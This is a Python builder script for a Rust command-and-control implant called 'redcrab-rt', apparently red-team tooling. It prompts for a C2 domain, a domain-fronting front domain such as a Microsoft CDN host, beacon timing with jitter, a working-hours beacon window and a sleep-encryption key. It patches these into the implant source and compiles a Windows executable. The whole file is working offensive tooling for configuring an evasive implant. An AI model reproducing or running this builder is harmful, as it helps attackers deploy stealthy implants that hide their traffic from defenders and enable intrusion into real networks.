#!/usr/bin/env python3
"""builder.py — patch C2 config into source files, then compile.

Prompts:
  C2 real domain     (Host header — your actual C2 listener)
  Front domain       (CDN SNI for domain fronting, e.g. ajax.microsoft.com)
  C2 port            (default 443)
  Beacon interval    (ms, default 15000)
  Jitter %           (default 30)
  Hour window        (default 8-20 local time)
  Dead-hours sleep   (seconds, default 3600)
  SLEEP_KEY          (16-byte hex or blank → random)
  Engagement ID      (optional label baked into binary; blank → random UUID)

Patches src/c2.rs and src/main.rs, then runs cargo build --release.
Prints a build summary including output binary SHA-256 for engagement records.
"""
import os, sys, re, random, subprocess, uuid, hashlib

# ── helpers ───────────────────────────────────────────────────────────────
def rand_key() -> list:
    return [random.randint(0, 255) for _ in range(16)]

def hex_to_bytes(s: str) -> list:
    s = s.replace(' ', '').replace('0x', '').replace(',', '')
    if len(s) != 32:
        raise ValueError('SLEEP_KEY must be exactly 16 bytes (32 hex chars)')
    return [int(s[i:i+2], 16) for i in range(0, 32, 2)]

def bytes_to_rust_array(b: list) -> str:
    return ', '.join(f'0x{x:02x}' for x in b)

def sha256_file(path: str) -> str:
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(65536), b''):
            h.update(chunk)
    return h.hexdigest()

def patch_file(path: str, replacements: dict):
    with open(path, 'r', encoding='utf-8') as f:
        content = f.read()
    for placeholder, value in replacements.items():
        if placeholder not in content:
            print(f'[warn] placeholder not found in {path}: {placeholder!r}')
        content = content.replace(placeholder, value)
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)
    print(f'[+] patched {path}')

# ── main ──────────────────────────────────────────────────────────────────
def main():
    print('=== redcrab-rt builder ===')
    c2_host    = input('C2 real domain (Host header) [e.g. c2.yourdomain.com]: ').strip()
    front      = input('Front domain SNI [e.g. ajax.microsoft.com, blank=same as C2]: ').strip()
    port_str   = input('C2 port [443]: ').strip() or '443'
    beacon_str = input('Beacon interval ms [15000]: ').strip() or '15000'
    jitter_str = input('Jitter %% [30]: ').strip() or '30'
    hour_start = input('Beacon window start hour 0-23 [8]: ').strip() or '8'
    hour_end   = input('Beacon window end   hour 0-23 [20]: ').strip() or '20'
    dead_sleep = input('Dead-hours sleep seconds [3600]: ').strip() or '3600'
    key_str    = input('SLEEP_KEY hex (32 chars, blank=random): ').strip()
    engage_id  = input('Engagement ID (blank=random UUID): ').strip()

    if not c2_host:
        print('[!] C2 host required'); sys.exit(1)
    if not front:
        front = c2_host
    if not engage_id:
        engage_id = str(uuid.uuid4())

    port       = int(port_str)
    beacon     = int(beacon_str)
    jitter     = int(jitter_str)
    h_start    = int(hour_start)
    h_end      = int(hour_end)
    dead_s     = int(dead_sleep)
    key_bytes  = hex_to_bytes(key_str) if key_str else rand_key()

    print()
    print(f'  C2 host       : {c2_host}')
    print(f'  Front domain  : {front}')
    print(f'  Port          : {port}')
    print(f'  Beacon        : {beacon} ms \u00b1{jitter}%')
    print(f'  Hours window  : {h_start:02d}:00 \u2013 {h_end:02d}:00 local')
    print(f'  Dead sleep    : {dead_s}s')
    print(f'  SLEEP_KEY     : {bytes_to_rust_array(key_bytes)}')
    print(f'  Engagement ID : {engage_id}')
    print()

    # ── Patch src/c2.rs ───────────────────────────────────────────────────
    patch_file('src/c2.rs', {
        'NGROK_HOST_PLACEHOLDER':                    c2_host,
        'FRONT_DOMAIN_PLACEHOLDER':                  front,
        'pub const C2_PORT:            u16  = 443;':
            f'pub const C2_PORT:            u16  = {port};',
        'pub const BEACON_INTERVAL_MS: u64  = 15_000;':
            f'pub const BEACON_INTERVAL_MS: u64  = {beacon};',
        'pub const JITTER_PCT:         u64  = 30;':
            f'pub const JITTER_PCT:         u64  = {jitter};',
        'pub const BEACON_HOUR_START:  u32  = 8;':
            f'pub const BEACON_HOUR_START:  u32  = {h_start};',
        'pub const BEACON_HOUR_END:    u32  = 20;':
            f'pub const BEACON_HOUR_END:    u32  = {h_end};',
        'pub const DEAD_SLEEP_SECS:    u64  = 3600;':
            f'pub const DEAD_SLEEP_SECS:    u64  = {dead_s};',
    })

    # ── Patch src/main.rs — SLEEP_KEY + BUILD_ID ──────────────────────────
    main_path = 'src/main.rs'
    with open(main_path, 'r', encoding='utf-8') as f:
        main_src = f.read()

    # SLEEP_KEY
    key_pat = re.compile(
        r'pub const SLEEP_KEY: \[u8; 16\] = \[[\s\S]*?\];', re.MULTILINE
    )
    new_key = (
        f'pub const SLEEP_KEY: [u8; 16] = [\n'
        f'    {bytes_to_rust_array(key_bytes[:8])},\n'
        f'    {bytes_to_rust_array(key_bytes[8:])},\n];'
    )
    main_src, n = key_pat.subn(new_key, main_src)
    if n == 0:
        print('[warn] SLEEP_KEY pattern not found in src/main.rs')

    # BUILD_ID — insert or replace
    build_id_pat = re.compile(
        r'pub const BUILD_ID: &str = "[^"]*";', re.MULTILINE
    )
    new_build_id = f'pub const BUILD_ID: &str = "{engage_id}";'
    if build_id_pat.search(main_src):
        main_src = build_id_pat.sub(new_build_id, main_src)
    else:
        # Insert after SLEEP_KEY block
        main_src = main_src.replace(
            'pub const PAYLOAD:',
            f'{new_build_id}\npub const PAYLOAD:'
        )

    with open(main_path, 'w', encoding='utf-8') as f:
        f.write(main_src)
    print('[+] patched src/main.rs (SLEEP_KEY + BUILD_ID)')

    # ── Compile ───────────────────────────────────────────────────────────
    print()
    print('[*] building...')
    result = subprocess.run(
        ['cargo', 'build', '--release', '--target', 'x86_64-pc-windows-msvc'],
    )
    if result.returncode != 0:
        print('[!] build failed')
        sys.exit(result.returncode)

    out = 'target/x86_64-pc-windows-msvc/release/redcrab-rt.exe'
    sha = sha256_file(out) if os.path.exists(out) else '(file not found)'

    print()
    print('=== build complete ===')
    print(f'  output   : {out}')
    print(f'  SHA-256  : {sha}')
    print(f'  build ID : {engage_id}')
    print()
    print('  Record SHA-256 + build ID in your engagement notes.')
    print('  Use build ID to deconflict if multiple implants run concurrently.')

if __name__ == '__main__':
    main()
